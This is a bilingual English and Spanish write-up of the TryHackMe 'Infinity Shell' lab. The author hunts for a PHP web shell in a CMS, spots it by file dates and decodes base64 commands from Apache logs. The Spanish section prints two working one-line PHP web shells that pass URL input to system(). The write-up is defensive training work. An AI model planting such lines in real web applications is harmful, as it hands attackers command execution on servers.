@@ -1,0 +1,297 @@
+# Infinity Shell — TryHackMe
+
+**EN**
+ 
+This is my writeup for **Infinity Shell**, the lab that closes the *Command Line* module on TryHackMe. I'm writing it the way it actually happened: with the mistakes, the detours, and the hints I had to ask for.
+ 
+---
+ 
+## The scenario
+ 
+The brief was short: some bots exploited a known vulnerability in a web application and left **web shell** implants behind. The job was to find them.
+ 
+When I started, I didn't really know what a web shell was.
+ 
+---
+ 
+## Starting blind
+ 
+I began with the basics to get my bearings:
+ 
+```bash
+pwd
+whoami
+ls
+echo $SHELL
+cat /etc/shells
+```
+ 
+My first idea was that one of the shells in `/etc/shells` wasn't original to the system, and that the attackers had added it. Since I didn't know which ones come by default, I didn't get very far with that.
+ 
+So I did what came naturally: went through the system folder by folder, even though I already felt it wasn't the right way to work.
+ 
+## The Firefox detour
+ 
+I ended up in `~/snap/firefox`, where there were two folders with numeric names: `4793` and `5836`. I thought they might be ports for some service in the lab, so I tried:
+ 
+```bash
+ping -c 3 <IP>:4793
+# ping: <IP>:4793: Name or service not known
+```
+ 
+It didn't work, and I concluded there was no website on that port. Later I found out the idea was wrong from the start:
+ 
+- Those numbers are **snap package revisions** for Firefox. Nothing to do with the lab.
+- `ping` uses ICMP (Internet Control Message Protocol), which **has no ports**. It was never going to work that way.
+Also, in some folders I saw `total 8` in the `ls -la` output and thought there were 8 files. I looked it up and that number is disk blocks: the folders were empty.
+ 
+That's when I stopped and told myself: before searching any further, I need to understand **what** I'm looking for.
+ 
+## Finding the application
+ 
+Something I didn't know and learned: on Linux, web applications usually live in `/var/www/html`.
+ 
+```bash
+ls -la /var/www/html
+# CMSsite-master/  index.html
+```
+ 
+There it was: a PHP CMS. I opened `localhost` in the browser and got a `405 Method Not Allowed`. Using the developer tools, I saw that both `GET /` and `GET /favicon.ico` returned the same thing. At least something was responding.
+ 
+## Looking for the web shell
+ 
+I got stuck and asked Echo, TryHackMe's assistant, for help. It reminded me of the `find` command:
+ 
+```bash
+find /var/www/html -type f -name '*.php' -print
+```
+ 
+It also told me something that stuck with me: the implanted file probably wouldn't have a strange name. That makes sense; in a real attack, nobody would call it `backdoor.php`.
+ 
+Looking at the list, an `images.php` inside `img/` caught my eye. I thought: why would an image need a PHP file? After checking the folder and seeing it had images in it, I doubted myself and set it aside.
+ 
+Meanwhile, I researched what a web shell is and found it can be as simple as a single line of PHP that passes whatever arrives through a URL parameter (for example `cmd`) to the `system()` function. In other words, it runs any command you send it on the server.
+ 
+> I'm not pasting the code literally on purpose: antivirus software flags it as a web shell even inside a text file.
+ 
+I tried to use `grep` to filter the PHP files that used `GET`. The first attempt returned nothing:
+ 
+```bash
+find /var/www/html/ -type f -name "*.php" | grep "*GET*"
+```
+ 
+That was my mistake: `find` returns paths, so `grep` was searching for "GET" in the file names, not inside the files. That's why it came back empty. I fixed it:
+ 
+```bash
+grep -rl --include="*.php" "GET" /var/www/html
+```
+ 
+It returned 16 files. Too many to go through one by one: any PHP file that reads a parameter uses `GET`. I asked for another hint, without getting the answer, and it pointed me toward thinking about what a web shell **combines**: user input plus a function that runs system commands, often hidden behind some kind of encoding.
+ 
+Another thing I hadn't looked at was the **dates**. In the `ls -la` of `CMSsite-master`, almost everything was from 2022, except `img/` and `includes/`, which were from 2025. In `includes/` I checked `db.php`, which had a different date, but found nothing. So I went back to `img/` and ran `cat images.php`.
+ 
+My initial suspicion was right. It was a web shell just like the example I had found, with a twist: before passing the command to `system()`, it decodes it with `base64_decode()`. In other words, the command arrives **base64-encoded** in the `query` URL parameter.
+ 
+## Now what?
+ 
+This is where I got stuck again. The hint was to change the question: I've found the backdoor, so **what did the attackers do with it?**
+ 
+Every time someone used it, they had to send a request to the server, and the server keeps a record of that. The Apache logs were in `/var/log/apache2`.
+ 
+`access.log` and `error.log` were empty. The reason is **log rotation**: Linux renames the old log and starts a new one. What I was looking for was in `other_vhosts_access.log.1`.
+ 
+## Decoding
+ 
+My first attempt was to pipe the `grep` output straight into `base64`:
+ 
+```bash
+grep "query=" other_vhosts_access.log.1 | base64 -d
+# base64: invalid input
+```
+ 
+It failed because `grep` was passing the whole log line (IP, date, user agent, everything), not just the encoded value.
+ 
+What I ended up doing was using `grep -o` to keep only the `query=...` parts and pasting the values into an online decoder. That revealed an `echo` with the flag: `THM{REDACTED}`.
+ 
+> In a lab it doesn't matter, but in a real incident you don't paste evidence into third-party sites: you decode it locally, with `base64 -d` or an offline copy of CyberChef.
+ 
+I wasn't satisfied, because I wanted to do it from the terminal. I rebuilt it afterwards, step by step, checking the output at each stage, with some help putting the commands together, like the regular expression and commands I hadn't seen before (`sed`, for example):
+ 
+```bash
+# 1. Keep only "query=<value>"
+grep -o 'query=[^ &]*' other_vhosts_access.log.1
+ 
+# 2. Strip "query=" (-f2- keeps the trailing '=' of the base64)
+grep -o 'query=[^ &]*' other_vhosts_access.log.1 | cut -d= -f2-
+ 
+# 3. Decode each value separately
+grep -o 'query=[^ &]*' other_vhosts_access.log.1 \
+  | cut -d= -f2- \
+  | sed 's/%3D/=/g' \
+  | while read -r q; do echo "$q" | base64 -d; echo; done
+```
+ 
+The most important thing I took from this: **a pipe passes exactly what you see on screen**. If you build the command one step at a time and look at the output, the error shows up on its own.
+ 
+---
+ 
+## What I'm taking away
+ 
+- **Understand before you search.** I wasted a lot of time going through folders without knowing what I was looking for. The moment I stopped to research what a web shell was changed everything.
+- **Search by content and by dates, not by name.**
+- **Think like an investigator.** Finding the malicious file is half the job; the other half is reconstructing what happened, and that's in the logs.
+## Being honest
+ 
+I didn't solve it on my own. I asked Echo for one hint and asked for several more about where to look, how logs work, and how to build the pipeline.
+ 
+I do give myself credit for some things I did on my own: suspecting `images.php` from the start, noticing the different dates, finding the Apache logs, and getting to `grep -o`. What I was missing was more knowledge than reasoning: regular expressions, and tools like `cut`, `sed`, and `base64`, which I hadn't seen in the module.
+ 
+My plan is to redo this lab in a few days, without looking at these notes, and get to the flag from the terminal, start to finish.
+ 
+**ES**
+
+Este es mi writeup de **Infinity Shell**, el lab que cierra el módulo *Command Line* en TryHackMe. Lo escribo tal cual lo viví: con los errores, los desvíos y las pistas que tuve que pedir. 
+
+---
+
+## El escenario
+
+La consigna era corta: unos bots explotaron una vulnerabilidad conocida en una aplicación web y dejaron implantes de **web shell**. Había que encontrarlos.
+
+Al arrancar, yo no tenía muy claro qué era una web shell.
+
+---
+
+## Arrancando a ciegas
+
+Empecé por lo básico para ubicarme:
+
+```bash
+pwd
+whoami
+ls
+echo $SHELL
+cat /etc/shells
+```
+
+Mi primera idea fue que alguna de las shells de `/etc/shells` no era original del sistema, ya que fue es el contenido anterior en la ruta de aprendizaje previo al laboratorio. Como no sabía cuáles venían por defecto, no llegué muy lejos con eso.
+
+Entonces hice lo que me salía: revisar carpeta por carpeta. Aunque en ese momento sentía que no era la forma correcta de trabajar.
+
+## El desvío de Firefox
+
+Terminé metido en `~/snap/firefox`, donde había dos carpetas con nombres numéricos: `4793` y `5836`. Se me ocurrió que podían ser puertos de algún servicio del lab, así que probé:
+
+```bash
+ping -c 3 <IP>:4793
+# ping: <IP>:4793: Name or service not known
+```
+
+No funcionó, y concluí que no había una web en ese puerto. Después descubi que la idea estaba mal desde el principio:
+
+- Esos números son **revisiones del paquete snap** de Firefox. Nada que ver con el lab.
+- `ping` usa ICMP (Internet Control Message Protocol), que **no tiene puertos**. Nunca iba a funcionar así.
+
+Además, en algunas carpetas leí `total 8` en el `ls -la` e investigue que eso son bloques de disco, las carpetas estaban vacías.
+
+Fue ahí donde paré y me dije: antes de seguir buscando, tengo que entender **qué** estoy buscando.
+
+## Encontrando la aplicación
+
+Algo que desconocia y aprendí que en Linux las aplicaciones web suelen vivir en `/var/www/html`. 
+
+```bash
+ls -la /var/www/html
+# CMSsite-master/  index.html
+```
+
+Ahí estaba: un CMS en PHP. Abrí `localhost` en el navegador y recibí un `405 Method Not Allowed`. Con las herramientas de desarrollador vi que tanto `GET /` como `GET /favicon.ico` daban lo mismo. Al menos algo estaba respondiendo.
+
+## Buscando la web shell
+
+Me trabé y le pedí ayuda a Echo, el asistente de TryHackMe. Me recordó el comando `find`:
+
+```bash
+find /var/www/html -type f -name '*.php' -print
+```
+
+También me dijo algo que me quedó: el archivo implantado probablemente no tenga un nombre raro. Tiene sentido; en un ataque real nadie lo llamaría `backdoor.php`.
+
+Mirando la lista, me llamó la atención un `images.php` dentro de `img/`. Pensé: ¿para qué necesita una imagen un PHP? Después de mirar la carpeta y ver que tenía imágenes, dudé y lo dejé de lado.
+
+Mientras tanto investigué qué es una web shell y encontré que puede ser algo tan simple como esto:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Una línea que ejecuta en el servidor cualquier comando que le mandes por la URL.
+
+Intenté filtrar con `grep` los PHP que usaran `GET`. El primer intento no devolvió nada:
+
+```bash
+find /var/www/html/ -type f -name "*.php" | grep "*GET*"
+```
+
+Ahí cometí un error: `find` devuelve rutas, así que `grep` buscaba "GET" en los nombres de los archivos y no dentro de ellos. Por eso no devolvía nada. Lo corregí:
+
+```bash
+grep -rl --include="*.php" "GET" /var/www/html
+```
+
+Me devolvió 16 archivos. Demasiados como para indagar uno por uno: cualquier PHP que lea un parámetro usa `GET`. Pidiendo un hint, sin la respuesta de cual archivo era, sino en que debía pensar en qué **combina** una web shell: entrada del usuario más una función que ejecuta comandos del sistema, muchas veces escondida con alguna codificación.
+
+Otra cosa que no había mirado eran las **fechas**. En el `ls -la` de `CMSsite-master`, casi todo era de 2022, salvo `img/` e `includes/`, que eran de 2025. En `includes/` revisé `db.php`, que tenía fecha distinta, pero no encontré nada. Así que volví a `img/`:
+
+```bash
+cat images.php
+# <?php system(base64_decode($_GET['query'])); ?>
+```
+
+Mi sospecha del principio era correcta. Es una web shell igual al ejemplo que había encontrado, pero con una vuelta: el comando llega **codificado en base64** en el parámetro `query`.
+
+## ¿Y ahora qué?
+
+Acá me quedé sin saber cómo seguir. La pista fue cambiar la pregunta: ya encontré la puerta trasera, **¿qué hicieron los atacantes con ella?**
+
+Cada vez que alguien la usó tuvo que hacer una petición al servidor, y el servidor guarda registro de eso. Los logs de Apache estaban en `/var/log/apache2`.
+
+`access.log` y `error.log` estaban vacíos. La razón es la **rotación de logs**: Linux renombra el log viejo y empieza uno nuevo. Lo que buscaba estaba en `other_vhosts_access.log.1`.
+
+## Decodificando
+
+Lo que terminé haciendo fue usar `grep -o` para quedarme con los `query=...` y pegar los valores en un decodificador online. Así salió un `echo` con la flag: `THM{REDACTED}`.
+
+No me quedé conforme, porque quería hacerlo por terminal. Lo rearmé después, paso a paso, mirando la salida en cada etapa y con ayuda de herramientas para armar bien los comandos como la expresión regular o comandos que no había visto (por ejemplo sed):
+
+```bash
+# 1. Me quedo solo con "query=<valor>"
+grep -o 'query=[^ &]*' other_vhosts_access.log.1
+
+# 2. Le saco el "query=" (el -f2- conserva el '=' final del base64)
+grep -o 'query=[^ &]*' other_vhosts_access.log.1 | cut -d= -f2-
+
+# 3. Decodifico cada valor por separado
+grep -o 'query=[^ &]*' other_vhosts_access.log.1 \
+  | cut -d= -f2- \
+  | sed 's/%3D/=/g' \
+  | while read -r q; do echo "$q" | base64 -d; echo; done
+```
+
+Lo más importante que saqué de esto: **un pipe pasa exactamente lo que ves en pantalla**. Si armás el comando de a un paso y mirás la salida, el error aparece solo.
+
+---
+
+## Lo que me llevo
+
+- **Entender antes de buscar.** Perdí bastante tiempo recorriendo carpetas sin saber qué buscaba. El momento en que paré a investigar qué era una web shell fue el que cambió todo.
+- **Buscar por contenido y por fechas, no por nombre.**
+- **Pensar como investigador.** Encontrar el archivo malicioso es la mitad; la otra mitad es reconstruir qué pasó, y eso está en los logs.
+
+## Siendo honesto
+
+No lo resolví solo. Pedí una pista a Echo y varias más sobre dónde buscar, cómo funcionan los logs y cómo armar el pipeline.
+
+Sí rescato que algunas cosas las hice por mi cuenta: sospechar de `images.php` desde el principio, notar las fechas distintas, encontrar los logs de Apache y llegar al `grep -o`. Lo que me faltó fue más conocimiento que razonamiento: expresiones regulares, y herramientas como `cut`, `sed` y `base64`, que no había visto en el módulo.
+
+Mi plan es volver a hacer este lab en unos días, sin mirar estas notas, y llegar a la flag por terminal de punta a punta.
